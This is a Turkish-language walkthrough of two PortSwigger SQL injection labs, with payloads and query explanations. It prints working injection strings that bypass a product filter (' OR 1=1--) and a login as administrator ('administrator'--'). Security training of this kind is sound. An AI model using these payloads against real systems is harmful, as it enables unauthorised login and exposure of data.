Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Hedef: Piyasaya sürülmemiş ürünleri listelemek.

Zaafiyet: category parametresi filtrelenmeden sorguya ekleniyor.
Orijinal sorgu: SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Payload:
GET /filter?category='+OR+1=1--

Açıklama:
- ' → category='' stringini kapatıp OR 1=1'i gerçek SQL koduna çeviriyor.
- -- → geri kalan sorguyu (kapanmamış tırnak + AND released=1 filtresi) yorum satırına alıp devre dışı bırakıyor.
- Sonuç sorgu: SELECT * FROM products WHERE category='' OR 1=1
- 1=1 her satır için true olduğundan released=0 olan (yayınlanmamış) ürünler de dahil tüm ürünler listeleniyor.

Alternatif payloadlar: ' OR '1'='1  |  ' OR 1=1#  |  ' OR 1=1/*

Sonuç: Çözüldü ✅

---

Lab: SQL injection vulnerability allowing login bypass
Zorluk: Kolay - https://portswigger.net/web-security/sql-injection/lab-login-bypass

Hedef: Şifre bilmeden administrator olarak login olmak.

Zaafiyet: Login sorgusu muhtemelen şu şekilde:
SELECT * FROM users WHERE username = 'x' AND password = 'y'
Önce tırnak (') denendi → syntax error döndü, injection'ın işareti.

Payload:
Username: administrator'--
Password: (herhangi bir şey)

Açıklama:
- ' → username='' stringini kapatıyor.
- -- → geri kalan sorguyu (AND password='...') yorum satırına alıp siliyor.
- Sonuç sorgu: SELECT * FROM users WHERE username='administrator'
- Password kontrolü hiç çalışmıyor, administrator olarak login oluyor.

Sonuç: Çözüldü ✅

---
